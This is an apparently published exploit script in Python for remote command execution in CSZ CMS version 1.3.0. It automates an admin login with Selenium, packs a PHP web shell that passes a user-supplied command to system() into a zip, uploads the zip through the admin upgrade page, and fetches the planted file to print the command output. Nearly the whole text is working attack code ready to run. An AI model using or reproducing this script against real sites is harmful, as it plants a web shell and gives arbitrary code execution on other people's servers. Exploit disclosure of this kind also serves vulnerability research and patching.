# Exploit Title: CSZ CMS Version 1.3.0 Remote Command Execution
# Date: 17/11/2023
# Exploit Author: tmrswrr
# Vendor Homepage: https://www.cszcms.com/
# Software Link: https://www.cszcms.com/link/3#https://sourceforge.net/projects/cszcms/files/latest/download
# Version: Version 1.3.0
# Tested on: https://www.softaculous.com/apps/cms/CSZ_CMS

##Use : python3 cz.py https://demos1.softaculous.com/CSZ_CMSladcjtgqrm/ id

import os
import zipfile
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from webdriver_manager.firefox import GeckoDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, TimeoutException
import requests
from time import sleep
import sys
import random
import time
import platform
import tarfile
from io import BytesIO

email = "demos@softaculous.com" 
password = "pass"

class colors:
    OKBLUE = '\033[94m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    CBLACK = '\33[30m'
    CRED = '\33[31m'
    CGREEN = '\33[32m'
    CYELLOW = '\33[33m'
    CBLUE = '\33[34m'
    CVIOLET = '\33[35m'
    CBEIGE = '\33[36m'
    CWHITE = '\33[37m'


color_random = [colors.CBLUE, colors.CVIOLET, colors.CWHITE, colors.OKBLUE, colors.CGREEN, colors.WARNING,
                colors.CRED, colors.CBEIGE]
random.shuffle(color_random)


def entryy():
    x = color_random[0] + """

╭━━━┳━━━┳━━━━╮╭━━━┳━╮╭━┳━━━╮╭━━━┳━━━┳━━━╮╭━━━┳━╮╭━┳━━━┳╮╱╱╭━━━┳━━┳━━━━╮
┃╭━╮┃╭━╮┣━━╮━┃┃╭━╮┃┃╰╯┃┃╭━╮┃┃╭━╮┃╭━╮┃╭━━╯┃╭━━┻╮╰╯╭┫╭━╮┃┃╱╱┃╭━╮┣┫┣┫╭╮╭╮┃
┃┃╱╰┫╰━━╮╱╭╯╭╯┃┃╱╰┫╭╮╭╮┃╰━━╮┃╰━╯┃┃╱╰┫╰━━╮┃╰━━╮╰╮╭╯┃╰━╯┃┃╱╱┃┃╱┃┃┃┃╰╯┃┃╰╯
┃┃╱╭╋━━╮┃╭╯╭╯╱┃┃╱╭┫┃┃┃┃┣━━╮┃┃╭╮╭┫┃╱╭┫╭━━╯┃╭━━╯╭╯╰╮┃╭━━┫┃╱╭┫┃╱┃┃┃┃╱╱┃┃
┃╰━╯┃╰━╯┣╯━╰━╮┃╰━╯┃┃┃┃┃┃╰━╯┃┃┃┃╰┫╰━╯┃╰━━╮┃╰━━┳╯╭╮╰┫┃╱╱┃╰━╯┃╰━╯┣┫┣╮╱┃┃
╰━━━┻━━━┻━━━━╯╰━━━┻╯╰╯╰┻━━━╯╰╯╰━┻━━━┻━━━╯╰━━━┻━╯╰━┻╯╱╱╰━━━┻━━━┻━━╯╱╰╯

                <<   CSZ CMS Version 1.3.0 RCE     >>
                <<      CODED BY TMRSWRR           >>
                <<     GITHUB==>capture0x          >>

\n"""
    for c in x:
        print(c, end='')
        sys.stdout.flush()
        sleep(0.0045)
    oo = " " * 6 + 29 * "░⣿" + "\n\n"
    for c in oo:
        print(colors.CGREEN + c, end='')
        sys.stdout.flush()
        sleep(0.0065)

    tt = " " * 5 + "░⣿" + " " * 6 + "WELCOME TO CSZ CMS Version 1.3.0 RCE Exploit" + " " * 7 + "░⣿" + "\n\n"
    for c in tt:
        print(colors.CWHITE + c, end='')
        sys.stdout.flush()
        sleep(0.0065)
    xx = " " * 6 + 29 * "░⣿" + "\n\n"
    for c in xx:
        print(colors.CGREEN + c, end='')
        sys.stdout.flush()
        sleep(0.0065)

def check_geckodriver():
    current_directory = os.path.dirname(os.path.abspath(__file__))
    geckodriver_path = os.path.join(current_directory, 'geckodriver')

    if not os.path.isfile(geckodriver_path):
        red = "\033[91m"
        reset = "\033[0m"
        print(red + "\n\nGeckoDriver (geckodriver) is not available in the script's directory." + reset)
        user_input = input("Would you like to download it now? (yes/no): ").lower()
        if user_input == 'yes':
            download_geckodriver(current_directory)
        else:
            print(red + "Please download GeckoDriver manually from: https://github.com/mozilla/geckodriver/releases" + reset)
            sys.exit(1)

def download_geckodriver(directory):

    print("[*] Detecting OS and architecture...")
    os_name = platform.system().lower()
    arch, _ = platform.architecture()

    if os_name == "linux":
        os_name = "linux"
        arch = "64" if arch == "64bit" else "32"
    elif os_name == "darwin":
        os_name = "macos"
        arch = "aarch64" if platform.processor() == "arm" else ""
    elif os_name == "windows":
        os_name = "win"
        arch = "64" if arch == "64bit" else "32"
    else:
        print("[!] Unsupported operating system.")
        sys.exit(1)

    geckodriver_version = "v0.33.0"
    geckodriver_file = f"geckodriver-{geckodriver_version}-{os_name}{arch}"
    ext = "zip" if os_name == "win" else "tar.gz"
    url = f"https://github.com/mozilla/geckodriver/releases/download/{geckodriver_version}/{geckodriver_file}.{ext}"

    print(f"[*] Downloading GeckoDriver for {platform.system()} {arch}-bit...")
    response = requests.get(url, stream=True)

    if response.status_code == 200:
        print("[*] Extracting GeckoDriver...")
        if ext == "tar.gz":
            with tarfile.open(fileobj=BytesIO(response.content), mode="r:gz") as tar:
                tar.extractall(path=directory)
        else:   
            with zipfile.ZipFile(BytesIO(response.content)) as zip_ref:
                zip_ref.extractall(directory)
        print("[+] GeckoDriver downloaded and extracted successfully.")
    else:
        print("[!] Failed to download GeckoDriver.")
        sys.exit(1)
        
def create_zip_file(php_filename, zip_filename, php_code):
    try:
        with open(php_filename, 'w') as file:
            file.write(php_code)
        with zipfile.ZipFile(zip_filename, 'w') as zipf:
            zipf.write(php_filename)
        print("[+] Zip file created successfully.")
        os.remove(php_filename)
        return zip_filename
    except Exception as e:
        print(f"[!] Error creating zip file: {e}")
        sys.exit(1)


def main(base_url, command):

    if not base_url.endswith('/'):
        base_url += '/'
        
    zip_filename = None   

    check_geckodriver()
    try:
        firefox_options = FirefoxOptions()
        firefox_options.add_argument("--headless")

        script_directory = os.path.dirname(os.path.abspath(__file__))
        geckodriver_path = os.path.join(script_directory, 'geckodriver')
        service = FirefoxService(executable_path=geckodriver_path)
        driver = webdriver.Firefox(service=service, options=firefox_options)
        print("[*] Exploit initiated.")

        # Login
        driver.get(base_url + "admin/login")
        print("[*] Accessing login page...")
        driver.find_element(By.NAME, "email").send_keys(f"{email}")
        driver.find_element(By.NAME, "password").send_keys(f"{password}")
        driver.find_element(By.ID, "login_submit").click()
        print("[*] Credentials submitted...")

 
        try:
            error_message = driver.find_element(By.XPATH, "//*[contains(text(), 'Email address/Password is incorrect')]")
            if error_message.is_displayed():
                print("[!] Login failed: Invalid credentials.")
                driver.quit()
                sys.exit(1)
        except NoSuchElementException:
            print("[+] Login successful.")

        # File creation  
        print("[*] Preparing exploit files...")
        php_code = f"<?php echo system('{command}'); ?>"
        zip_filename = create_zip_file("exploit.php", "payload.zip", php_code)

 
        driver.get(base_url + "admin/upgrade")
        print("[*] Uploading exploit payload...")
        file_input = driver.find_element(By.ID, "file_upload")
        file_input.send_keys(os.path.join(os.getcwd(), zip_filename))

  	# Uploading
        driver.find_element(By.ID, "submit").click()
        WebDriverWait(driver, 10).until(EC.alert_is_present())
        alert = driver.switch_to.alert
        alert.accept()

        # Exploit result 
        exploit_url = base_url + "exploit.php"
        response = requests.get(exploit_url)
        print(f"[+] Exploit response:\n\n{response.text}")

    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        driver.quit()
        if zip_filename and os.path.exists(zip_filename):
            os.remove(zip_filename)

if __name__ == "__main__":
    entryy()
    if len(sys.argv) < 3:
        print("Usage: python script.py [BASE_URL] [COMMAND]")
    else:
        main(sys.argv[1], sys.argv[2])
